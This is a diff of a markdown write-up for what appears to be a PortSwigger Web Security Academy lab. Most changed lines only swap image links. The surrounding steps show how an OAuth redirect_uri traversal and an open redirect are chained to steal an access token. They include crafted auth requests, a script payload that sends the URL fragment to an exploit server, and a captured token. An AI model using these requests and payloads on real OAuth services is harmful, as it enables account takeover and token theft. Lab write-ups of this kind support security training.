@@ -16,31 +16,31 @@
 
 step 1
 
-![[lab4_http_history_redirect_uri.png]]
+![](images/lab4_http_history_redirect_uri.jpg)
 
 step 2
 
 logout and login again and see HTTP history
 
-![[lab4_http_history_redirect_uri_access_token.png]]
+![](images/lab4_http_history_redirect_uri_access_token.jpg)
 
 step 3
 send step 2 to repeater
 change uri with google.com
 
-![[lab4_change_uri_bad_request.png]]
+![](images/lab4_change_uri_bad_request.jpg)
 
 step 4
 in uri section test with /../post?/postId=8
 it give 302 response
-![[lab4_uri_test_post_id.png]]
+![](images/lab4_uri_test_post_id.jpg)
 
 step 5
 Note in this lab if you logout and login again you don't need to enter user-id and password
 it will automatically login
 
 now logout and click on my account and intercept process until you reach at redirect_uri
-![[lab4_social_login_uri.png]]
+![](images/lab4_social_login_uri.jpg)
 
 step 6
 
@@ -50,11 +50,11 @@ add /../
 GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post?postId=8&response_type=token&nonce=-2006832369&scope=openid%20profile%20email HTTP/2
 ```
 
-![[lab4_intercept_uri.png]]
+![](images/lab4_intercept_uri.jpg)
 
 you will redirect to post 8
 
-![[lab4_after_forward_access_token_with_postid.png]]
+![](images/lab4_after_forward_access_token_with_postid.jpg)
 
 this is complete url
 
@@ -66,19 +66,19 @@ step 7
 
 in the post in the bottom section there is next button
 
-![[lab4_next_post_link_at_bottom_of_post.png]]
+![](images/lab4_next_post_link_at_bottom_of_post.jpg)
 
 click on next
 
 it will redirect to next post
 earlier it was 8 not it is 9
-![[lab4_post_id_9.png]]
+![](images/lab4_post_id_9.jpg)
 
 step 8
 
 go to HTTP history again find next url
 
-![[lab4_next_path_url_302__found.png]]
+![](images/lab4_next_path_url_302__found.jpg)
 
 step 8
 send step 7 to repeater and path= https://google.com
@@ -89,7 +89,7 @@ GET /post/next?path=https://google.com HTTP/2
 
 you will get 302 response
 
-![[lab4_change_next_path_url_add_google_url.png]]
+![](images/lab4_change_next_path_url_add_google_url.jpg)
 
 step 9
 now click on my account
@@ -105,7 +105,7 @@ change to
 GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post/next?path=https://google.com&response_type=token&nonce=794310292&scope=openid%20profile%20email HTTP/2
 ```
 
-![[lab4_redirect_google_with_access_token.png]]
+![](images/lab4_redirect_google_with_access_token.jpg)
 
 ---
 
@@ -118,7 +118,7 @@ add payload to exploit
 <script>window.location = '/?'+document.location.hash.substr(1)</script>
 ```
 
-![[lab4_add_first_payload.png]]
+![](images/lab4_add_first_payload.jpg)
 and in uri section add `/../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit`
 
 ```
@@ -131,11 +131,11 @@ change to
 GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit&response_type=token&nonce=599160809&scope=openid%20profile%20email
 ```
 
-![[lab4_forward_path_id_uri_intercept.png]]
+![](images/lab4_forward_path_id_uri_intercept.jpg)
 
 it will redirect to exploit url
 
-![[lab4_access_token_exploit_web_page.png]]
+![](images/lab4_access_token_exploit_web_page.jpg)
 
 copy url from browser for access_token
 
@@ -146,7 +146,7 @@ https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/?access_toke
 or
 click on access log for token
 
-![[lab4_access_log_access+token.png]]
+![](images/lab4_access_log_access+token.jpg)
 
 ```
 access_token=M12aNQq8S1W7vYy5iibr7qzN4LfbBhAyIdvZ41tG9m_
@@ -157,13 +157,13 @@ access_token=M12aNQq8S1W7vYy5iibr7qzN4LfbBhAyIdvZ41tG9m_
 step 11
 go to HTTP history click on me you will see api-key of user
 
-![[lab4_http_history_me_request.png]]
+![](images/lab4_http_history_me_request.jpg)
 
 now send to the repeater use token key `M12aNQq8S1W7vYy5iibr7qzN4LfbBhAyIdvZ41tG9m_` from **\_\_\_\_**
 
 step 10
 
-![[lab4_change_token_to_get_user_api_key.png]]
+![](images/lab4_change_token_to_get_user_api_key.jpg)
 
 ---
 
@@ -205,7 +205,7 @@ final payload
 </script>
 ```
 
-![[lab4_add_payload_exploit.png]]
+![](images/lab4_add_payload_exploit.jpg)
 
 ---
 
@@ -218,15 +218,15 @@ add and forward request
 /../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit
 ```
 
-![[lab4_test_post_id_path_redirect_uri.png]]
+![](images/lab4_test_post_id_path_redirect_uri.jpg)
 
 you will redirect to exploit page go to access log see if any different ip which contain access token
 
-![[lab4_access_token_with_different_api_key.png]]
+![](images/lab4_access_token_with_different_api_key.jpg)
 
 copy token and paste to repeater at /me in authorization section
 
-![[lab4_admin_api_key.png]]
+![](images/lab4_admin_api_key.jpg)
 
 ```json
 {
@@ -243,4 +243,4 @@ copy token and paste to repeater at /me in authorization section
 step 14
 submit api-key to solve lab
 
-![[portswigger_wsa/P03_advanced_topics/P22_OAuth_authentication/images/lab4_lab_solved.png]]
+![](images/lab4_lab_solved.jpg)
